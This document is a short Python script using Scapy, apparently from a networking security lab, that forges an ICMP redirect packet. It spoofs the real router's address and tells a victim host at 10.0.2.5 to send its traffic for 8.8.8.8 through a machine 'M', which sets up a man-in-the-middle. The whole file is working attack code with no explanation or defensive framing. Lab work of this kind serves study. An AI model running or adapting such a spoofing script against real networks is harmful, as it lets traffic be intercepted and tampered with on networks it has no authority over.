#!/usr/bin/python3
from scapy.all import *
victim_ip = '10.0.2.5'
victim_mac = '08:00:27:80:28:bc'
M_machine_ip = '10.0.2.4'
real_router_ip = '10.0.2.1'
dst_machine_ip = '8.8.8.8'
#ether header
eth = Ether()
eth.dst = victim_mac
#ip header
ip = IP()
ip.src = real_router_ip #old router
ip.dst = victim_ip #victim machine
#icmp header
icmp = ICMP()
icmp.type = 5  # Type 5 = Redirect
icmp.code = 1  # Code 1 = Redirect for host
icmp.gw = M_machine_ip # redicrect the packet to machine M
#ip2 header
ip2 = IP()
ip2.src = victim_ip #victim machine
ip2.dst = dst_machine_ip #destination machine
#udp header
udp = UDP()
#constracting packet
pkt = eth/ip/icmp/ip2/udp
sendp(pkt, verbose=0)